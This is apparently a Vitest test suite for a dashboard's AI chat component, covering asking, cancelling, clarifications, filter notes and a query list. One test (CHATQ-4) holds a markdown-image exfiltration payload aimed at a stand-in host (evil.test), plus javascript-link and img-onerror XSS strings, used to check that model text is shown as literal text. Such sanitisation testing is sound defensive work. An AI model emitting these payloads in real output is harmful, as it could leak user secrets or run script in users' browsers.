import React from "react";
import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";

vi.mock("../../lib/aiSession/askRunner", async () => {
  const actual = await vi.importActual<typeof import("../../lib/aiSession/askRunner")>("../../lib/aiSession/askRunner");
  return { ...actual, runAsk: vi.fn(async () => {}), cancelAsk: vi.fn() };
});

import { runAsk, cancelAsk } from "../../lib/aiSession/askRunner";
import type { AskContext } from "../../lib/aiSession/askRunner";
import { useAiSessionStore } from "../../store/aiSessionStore";
import type { Turn, TurnChat } from "../../lib/aiSession/types";
import { AiChat, AiAskBox } from "./AiChat";
import { useFilterStore } from "../../store/filterStore";
import { describeQueryEntry } from "../../lib/aiSession/chatText";
import type { AskQueryEntry } from "@kinetica-bi/shared";

const baseline = { dashboardId: 1, widgets: [], layers: [], dynamicViewIds: [] };
const ctx: AskContext = {
  dashboardId: 1,
  getBaseline: () => baseline,
  getSnapshot: () => ({}) as never,
  tables: [{ id: 1, schema: "s", name: "taxi", columns: { fare_amount: "double", payment_type: "varchar(16)" } }],
};

function turn(i: number, prompt: string, answer: string, chat?: TurnChat): Turn {
  return { id: `t${i}`, prompt, answer, entries: [], createdAt: i, chat: chat ?? { status: "ok", followUps: [] } };
}
function seed(turns: Turn[], cursor = turns.length - 1) {
  useAiSessionStore.setState({ turns, cursor });
}

beforeEach(() => {
  vi.clearAllMocks();
  useAiSessionStore.getState().reset();
});

describe("AiChat", () => {
  it("CHAT-1: empty state + starters ask once under StrictMode", async () => {
    render(
      <React.StrictMode>
        <AiChat ctx={ctx} variant="inline" />
      </React.StrictMode>,
    );
    expect(screen.getByText("Ask about this dashboard's data")).toBeTruthy();
    const starter = screen.getByRole("button", { name: "Show total fare_amount by payment_type" });
    await userEvent.click(starter);
    expect(runAsk).toHaveBeenCalledTimes(1);
    expect(runAsk).toHaveBeenCalledWith(ctx, "Show total fare_amount by payment_type");
  });

  it("CHAT-2: Enter sends, Shift+Enter newline, IME does not send, maxLength 2000", async () => {
    render(<AiChat ctx={ctx} variant="inline" />);
    const ta = screen.getByLabelText("Ask the AI") as HTMLTextAreaElement;
    expect(ta.maxLength).toBe(2000);
    await userEvent.type(ta, "a{Shift>}{Enter}{/Shift}b");
    expect(runAsk).not.toHaveBeenCalled();
    expect(ta.value).toBe("a\nb");
    useAiSessionStore.getState().setDraft("");
    await userEvent.type(ta, "hello{Enter}");
    expect(runAsk).toHaveBeenCalledTimes(1);
    expect(runAsk).toHaveBeenCalledWith(ctx, "hello");
    vi.mocked(runAsk).mockClear();
    useAiSessionStore.getState().setDraft("ime");
    const ev = new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true, isComposing: true });
    ta.dispatchEvent(ev);
    expect(runAsk).not.toHaveBeenCalled();
  });

  it("CHAT-3: follow-ups, template fallback, revert uses store index", async () => {
    seed([
      turn(0, "q1", "a1", { status: "ok", followUps: ["F1", "F2"] }),
      turn(1, "q2", "a2", { status: "ok", followUps: [] }),
    ]);
    render(<AiChat ctx={ctx} variant="drawer" />);
    await userEvent.click(screen.getByRole("button", { name: "F1" }));
    expect(runAsk).toHaveBeenCalledWith(ctx, "F1");
    expect(screen.getByRole("button", { name: "F2" })).toBeTruthy();
    // second answer falls back to local template follow-ups
    expect(screen.getAllByRole("button", { name: "Show total fare_amount by payment_type" }).length).toBeGreaterThan(0);
    const reverts = screen.getAllByRole("button", { name: "Revert dashboard to this state" });
    expect(reverts).toHaveLength(2);
    const spy = vi.spyOn(useAiSessionStore.getState(), "setCursor");
    useAiSessionStore.setState({ setCursor: spy });
    await userEvent.click(reverts[0]);
    expect(spy).toHaveBeenCalledWith(0, baseline);
  });

  it("CHAT-4: running status, elapsed, Cancel, typeable box, disabled suggestions", async () => {
    seed([turn(0, "q1", "a1", { status: "ok", followUps: ["F1"] })]);
    useAiSessionStore.setState({
      run: { status: "running", question: "next", startedAt: Date.now() - 12_000, line: "Adding a chart…" },
    });
    render(<AiChat ctx={ctx} variant="inline" />);
    const status = screen.getByRole("status");
    expect(status.textContent).toContain("Adding a chart…");
    expect(status.textContent).toContain("12s");
    expect(screen.queryByRole("button", { name: "Send" })).toBeNull();
    await userEvent.click(screen.getByRole("button", { name: "Cancel" }));
    expect(cancelAsk).toHaveBeenCalledTimes(1);
    const ta = screen.getByLabelText("Ask the AI") as HTMLTextAreaElement;
    expect(ta.disabled).toBe(false);
    await userEvent.type(ta, "x");
    expect(ta.value).toBe("x");
    expect((screen.getByRole("button", { name: "F1" }) as HTMLButtonElement).disabled).toBe(true);
  });

  it("CHAT-5: cancelled note, error message, Retry only when retryable", async () => {
    seed([
      turn(0, "qc", "", { status: "cancelled" }),
      turn(1, "qe", "", { status: "error", message: "Provider exploded", retryable: true }),
      turn(2, "qn", "", { status: "error", message: "Nope forbidden", retryable: false }),
    ]);
    render(<AiChat ctx={ctx} variant="inline" />);
    expect(screen.getByText("Cancelled, nothing changed")).toBeTruthy();
    expect(screen.getByText("Provider exploded")).toBeTruthy();
    expect(screen.getByText("Nope forbidden")).toBeTruthy();
    const retries = screen.getAllByRole("button", { name: "Retry" });
    expect(retries).toHaveLength(1);
    await userEvent.click(retries[0]);
    expect(runAsk).toHaveBeenCalledWith(ctx, "qe");
  });

  it("CHAT-6: choices click, picked state, older turns disabled", async () => {
    const clar = { kind: "confirm_remove" as const, question: "Remove it?", options: [{ id: "yes", label: "Yes" }, { id: "no", label: "No" }] };
    seed([turn(0, "remove", "ok?", { status: "ok", followUps: [], clarifications: [clar] })]);
    const { unmount } = render(<AiChat ctx={ctx} variant="inline" />);
    await userEvent.click(screen.getByRole("button", { name: "Yes" }));
    expect(runAsk).toHaveBeenCalledWith(ctx, "Yes, remove it", {
      pick: { turnIndex: 0, clarificationIndex: 0, optionId: "yes", approveRemoval: true },
    });
    unmount();
    seed([turn(0, "remove", "ok?", { status: "ok", followUps: [], clarifications: [clar], pickedChoice: { clarificationIndex: 0, optionId: "yes" } })]);
    render(<AiChat ctx={ctx} variant="inline" />);
    const yes = screen.getByRole("button", { name: /Yes/ }) as HTMLButtonElement;
    const no = screen.getByRole("button", { name: "No" }) as HTMLButtonElement;
    expect(yes.disabled).toBe(true);
    expect(no.disabled).toBe(true);
    expect(yes.getAttribute("aria-pressed")).toBe("true");
    expect(yes.textContent).toContain("✓");
  });

  it("CHAT-6b: a clarification on an older turn is disabled", () => {
    const clar = { kind: "choose_option" as const, question: "Which?", options: [{ id: "a", label: "Alpha" }] };
    seed([
      turn(0, "q0", "a0", { status: "ok", followUps: [], clarifications: [clar] }),
      turn(1, "q1", "a1", { status: "ok", followUps: [] }),
    ]);
    render(<AiChat ctx={ctx} variant="inline" />);
    expect((screen.getByRole("button", { name: "Alpha" }) as HTMLButtonElement).disabled).toBe(true);
  });

  it("CHAT-7: skipped via describeSkipped, clarification-stage hidden, no HTML", () => {
    seed([
      turn(0, "q", "<b>x</b>", {
        status: "ok",
        followUps: [],
        skipped: [
          { label: "add_widget", stage: "validate", reasons: ["bad column"] },
          { label: "hiddenthing", stage: "clarification", reasons: ["r"] },
        ],
      }),
    ]);
    const { container } = render(<AiChat ctx={ctx} variant="inline" />);
    expect(screen.getByText("Couldn't do: add a chart (bad column)")).toBeTruthy();
    expect(container.textContent).not.toContain("hiddenthing");
    expect(screen.getByText("<b>x</b>")).toBeTruthy();
    expect(container.querySelector("b")).toBeNull();
  });

  it("CHAT-8: two ask boxes share the draft and both show Cancel while running", async () => {
    render(
      <>
        <div data-testid="a"><AiAskBox ctx={ctx} /></div>
        <div data-testid="b"><AiAskBox ctx={ctx} /></div>
      </>,
    );
    const [t1, t2] = screen.getAllByLabelText("Ask the AI") as HTMLTextAreaElement[];
    await userEvent.type(t1, "shared");
    expect(t2.value).toBe("shared");
    useAiSessionStore.setState({ run: { status: "running", question: "q", startedAt: Date.now(), line: "x" } });
    expect(await within(screen.getByTestId("a")).findByRole("button", { name: "Cancel" })).toBeTruthy();
    expect(within(screen.getByTestId("b")).getByRole("button", { name: "Cancel" })).toBeTruthy();
  });

  it("UAT12-1: clarification shows its question once, no template follow-ups, no Revert when nothing changed", () => {
    const clar = { kind: "choose_option" as const, question: "Which total?", options: [{ id: "1", label: "Fare" }, { id: "2", label: "Tip" }] };
    seed([turn(0, "Show the total", "Which total?", { status: "ok", followUps: [], clarifications: [clar] })]);
    render(<AiChat ctx={ctx} variant="inline" />);
    expect(screen.getAllByText("Which total?")).toHaveLength(1);
    expect(screen.queryByRole("button", { name: "Show total fare_amount by payment_type" })).toBeNull();
    expect(screen.queryByRole("button", { name: "Revert dashboard to this state" })).toBeNull();
    expect(screen.getByRole("button", { name: "Fare" })).toBeTruthy();
  });

  it("UAT12-2: a differently worded choice question keeps its label; AI follow-ups still show", () => {
    const clar = { kind: "choose_option" as const, question: "Pick one", options: [{ id: "1", label: "Fare" }] };
    seed([turn(0, "Show the total", "I can show two totals.", { status: "ok", followUps: ["Show by month"], clarifications: [clar] })]);
    render(<AiChat ctx={ctx} variant="inline" />);
    expect(screen.getByText("Pick one")).toBeTruthy();
    expect(screen.getByRole("button", { name: "Show by month" })).toBeTruthy();
  });

  describe("filter notes and clear offer (138)", () => {
    const empty = [{ source: { kind: "table" as const, id: 5 }, column: "payment_type" }];
    beforeEach(() => {
      useFilterStore.setState({ filters: {}, dvFilters: {} });
    });

    it("CHATF-1: filterNotes render in order as ai-chat-note muted, after the answer", () => {
      seed([turn(0, "q", "ANSWER", { status: "ok", followUps: [], filterNotes: ["Note one.", "Note two."] })]);
      const { container } = render(<AiChat ctx={ctx} variant="inline" />);
      const notes = Array.from(container.querySelectorAll(".ai-chat-note.muted")).map((n) => n.textContent);
      expect(notes).toEqual(["Note one.", "Note two."]);
      const answer = screen.getByText("ANSWER");
      const n1 = screen.getByText("Note one.");
      expect(answer.compareDocumentPosition(n1) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
    });

    it("CHATF-2: zero-row clear offer removes the filter and disappears", async () => {
      useFilterStore.getState().addFilter(5, { column: "payment_type", value: "Credit", dataType: "string", addedAt: 1 });
      seed([turn(0, "q", "a", { status: "ok", followUps: [], emptyFilters: empty })]);
      const { container } = render(<AiChat ctx={ctx} variant="inline" />);
      const btn = screen.getByRole("button", { name: "Clear the payment_type filter" });
      expect(btn.className).toContain("ghost-sm");
      expect(btn.textContent).toBe("Clear this filter");
      expect(btn.closest(".ai-chat-turn-actions")).toBeTruthy();
      await userEvent.click(btn);
      expect(useFilterStore.getState().filters[5] ?? []).toEqual([]);
      expect(screen.queryByRole("button", { name: "Clear the payment_type filter" })).toBeNull();
      expect(container.textContent).not.toContain("Clear this filter");
    });

    it("CHATF-3: no clear offer when the filter is already gone", () => {
      seed([turn(0, "q", "a", { status: "ok", followUps: [], emptyFilters: empty })]);
      render(<AiChat ctx={ctx} variant="inline" />);
      expect(screen.queryByRole("button", { name: "Clear the payment_type filter" })).toBeNull();
    });

    it("CHATF-4: a filter-only applied turn shows Revert", () => {
      const t = turn(0, "q", "a", { status: "ok", followUps: [], clarifications: [{ kind: "choose_option", question: "Which?", options: [{ id: "a", label: "A" }] } as never] });
      t.entries = [{ raw: {}, op: null, result: { status: "applied" } }];
      seed([t]);
      render(<AiChat ctx={ctx} variant="inline" />);
      expect(screen.getByRole("button", { name: "Revert dashboard to this state" })).toBeTruthy();
    });
  });
});

describe("query list (140)", () => {
  const Q1 = "SELECT vendor, COUNT(*) AS n FROM demo.trips GROUP BY vendor";
  const Q2 = "DELETE FROM demo.trips";
  const Q3 = "SELECT * FROM demo.trips";
  const R2 = "only a single SELECT (or WITH ... SELECT) is allowed";
  const queries: AskQueryEntry[] = [
    { sql: Q1, rowCount: 2, outcome: "ok" },
    { sql: Q2, outcome: "refused", reason: R2 },
    { sql: Q3, outcome: "timed_out" },
  ];

  it("CHATQ-1: collapsed toggle, no SQL in the document", () => {
    seed([turn(0, "q", "a", { status: "ok", followUps: [], queries })]);
    const { container } = render(<AiChat ctx={ctx} variant="inline" />);
    const btn = screen.getByRole("button", { name: "Ran 3 queries" });
    expect(btn.className).toContain("ghost-sm");
    expect(btn.getAttribute("aria-expanded")).toBe("false");
    expect(container.textContent).not.toContain(Q1);
    expect(container.textContent).not.toContain(Q2);
    expect(container.textContent).not.toContain(Q3);
  });

  it("CHATQ-2: expand lists each query with its outcome; click again collapses", async () => {
    seed([turn(0, "q", "a", { status: "ok", followUps: [], queries })]);
    const { container } = render(<AiChat ctx={ctx} variant="inline" />);
    const btn = screen.getByRole("button", { name: "Ran 3 queries" });
    await userEvent.click(btn);
    expect(btn.getAttribute("aria-expanded")).toBe("true");
    const notes = Array.from(container.querySelectorAll(".ai-chat-note.muted")).map((n) => n.textContent);
    expect(notes).toEqual([`${Q1} \u2014 2 rows`, `${Q2} \u2014 refused: ${R2}`, `${Q3} \u2014 timed out`]);
    await userEvent.click(btn);
    expect(btn.getAttribute("aria-expanded")).toBe("false");
    expect(container.querySelectorAll(".ai-chat-note.muted").length).toBe(0);
  });

  it("CHATQ-3: no toggle without queries; singular; describeQueryEntry", () => {
    seed([turn(0, "q", "a", { status: "ok", followUps: [] }), turn(1, "q", "a", { status: "ok", followUps: [], queries: [] })]);
    const r = render(<AiChat ctx={ctx} variant="inline" />);
    expect(screen.queryByRole("button", { name: /^Ran / })).toBeNull();
    r.unmount();
    seed([turn(0, "q", "a", { status: "ok", followUps: [], queries: [queries[0]] })]);
    render(<AiChat ctx={ctx} variant="inline" />);
    expect(screen.getByRole("button", { name: "Ran 1 query" })).toBeTruthy();
    expect(describeQueryEntry({ sql: "x", rowCount: 1, outcome: "ok" })).toBe("1 row");
    expect(describeQueryEntry({ sql: "x", rowCount: 0, outcome: "ok" })).toBe("0 rows");
    expect(describeQueryEntry({ sql: "x", outcome: "cancelled" })).toBe("cancelled");
    expect(describeQueryEntry({ sql: "x", outcome: "error", reason: "boom" })).toBe("failed: boom");
    expect(describeQueryEntry({ sql: "x", outcome: "error" })).toBe("failed");
  });

  it("CHATQ-4: markup renders as literal text on every model-text surface", async () => {
    const M = '![x](https://evil.test/a.png?d=SECRET) [click](javascript:alert(1)) <img src=x onerror="alert(1)"> <b>bold</b> **strong**';
    const SQL = "SELECT '<img src=x>' AS a FROM demo.trips";
    seed([
      turn(0, "q", M, {
        status: "ok",
        followUps: [M],
        filterNotes: [M],
        queries: [{ sql: SQL, rowCount: 1, outcome: "ok" }],
        clarifications: [{ kind: "choose_option", question: "Which one? " + M, options: [{ id: "a", label: M }] } as never],
      }),
    ]);
    const { container } = render(<AiChat ctx={ctx} variant="inline" />);
    await userEvent.click(screen.getByRole("button", { name: "Ran 1 query" }));
    expect(container.querySelector("img, a, b, strong, script")).toBeNull();
    const bubble = container.querySelector(".ai-chat-bubble--ai");
    expect(bubble?.textContent).toBe(M);
    const notes = Array.from(container.querySelectorAll(".ai-chat-note.muted")).map((n) => n.textContent ?? "");
    expect(notes).toContain(M);
    expect(notes.some((n) => n.includes(SQL))).toBe(true);
    expect(screen.getAllByRole("button", { name: M }).length).toBe(2); // choice + follow-up
    expect(container.textContent).toContain("Which one? " + M);
  });

  it("CHATQ-5: expanded state is per turn", async () => {
    seed([
      turn(0, "q1", "a1", { status: "ok", followUps: [], queries }),
      turn(1, "q2", "a2", { status: "ok", followUps: [], queries }),
    ]);
    render(<AiChat ctx={ctx} variant="inline" />);
    const btns = screen.getAllByRole("button", { name: "Ran 3 queries" });
    await userEvent.click(btns[0]);
    expect(btns[0].getAttribute("aria-expanded")).toBe("true");
    expect(btns[1].getAttribute("aria-expanded")).toBe("false");
  });
});
